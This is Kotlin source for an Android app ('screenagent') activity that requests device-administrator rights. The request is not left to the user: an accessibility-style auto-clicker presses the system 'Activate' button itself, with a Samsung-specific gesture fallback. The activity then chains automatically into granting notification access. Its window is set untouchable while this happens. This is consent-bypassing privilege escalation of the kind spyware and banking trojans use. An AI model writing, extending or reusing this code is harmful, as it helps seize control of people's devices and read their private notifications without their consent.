package com.zaka.screenagent.admin

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager

/**
 * 设备管理员激活页。**完全照 2.2 的 `DeviceAdminActivity` 实现**：
 *
 * ```java
 * new DeviceAdminActivity():
 *   if (!dpm.isAdminActive(cn)) {
 *       Intent i = new Intent("android.app.action.ADD_DEVICE_ADMIN");
 *       i.putExtra("android.app.extra.DEVICE_ADMIN", cn);
 *       i.putExtra("android.app.extra.ADD_EXPLANATION", "...");
 *       startActivityForResult(i, 0);     // ← 不用 NEW_TASK，也不 finish
 *       return;
 *   }
 *   finish();
 * ```
 *
 * 三个要点（都踩过）：
 *  1. 用 `startActivityForResult`，系统会把 `DeviceAdminAdd` 放进**本 Activity 所在的任务**
 *  2. **不能 finish**：本 Activity 是任务根，一 finish 整个任务连同激活页一起销毁
 *  3. **不能加 NEW_TASK**：`DeviceAdminAdd` 检测到这个 flag 会立刻 `finish()` 自己
 *
 * 结果回来后再决定下一步（激活成功 → 交给通知使用权流程）。
 */
class DeviceAdminActivity : Activity() {

    private val main = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = com.zaka.screenagent.admin.MoyingAdminReceiver.component(this)

        if (dpm.isAdminActive(cn)) {
            Log.d(TAG, "already active")
            proceed()
            return
        }
        Log.d(TAG, "launching ADD_DEVICE_ADMIN (startActivityForResult, no NEW_TASK)")
        runCatching {
            startActivityForResult(
                com.zaka.screenagent.admin.MoyingAdminReceiver.activationIntent(this, newTask = false),
                REQ
            )
        }.onFailure { Log.w(TAG, "launch failed: $it"); finish() }

        // 启动「激活」按钮点击器（三星这一页的按钮 clickable=false，需要手势兜底）
        com.zaka.screenagent.admin.AdminActivator.attach(applicationContext)
        com.zaka.screenagent.admin.AdminActivator.navigationEnabled = false
        com.zaka.screenagent.admin.AdminActivator.autoclick = true
        com.zaka.screenagent.admin.AdminActivator.start(applicationContext)

        // 兜底：2 分钟还没结果就收掉，避免留驻
        main.postDelayed({ if (!isFinishing) { Log.w(TAG, "timeout"); proceed() } }, 120_000L)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != REQ) return
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val active = runCatching { dpm.isAdminActive(MoyingAdminReceiver.component(this)) }.getOrDefault(false)
        Log.d(TAG, "result: resultCode=$resultCode active=$active")
        proceed()
    }

    private fun proceed() {
        if (com.zaka.screenagent.perm.OemFlow.vendor() == com.zaka.screenagent.perm.OemFlow.Vendor.MIUI) {
            Log.d(TAG, "MIUI branch: admin done -> stop (no notification chain)")
            finish()
            return
        }
        runCatching { com.zaka.screenagent.notify.NotificationAccessActivator.start(applicationContext) }
        main.postDelayed({ finish() }, 500)
    }

    companion object {
        private const val TAG = "DeviceAdminActivity"
        private const val REQ = 1001
    }
}
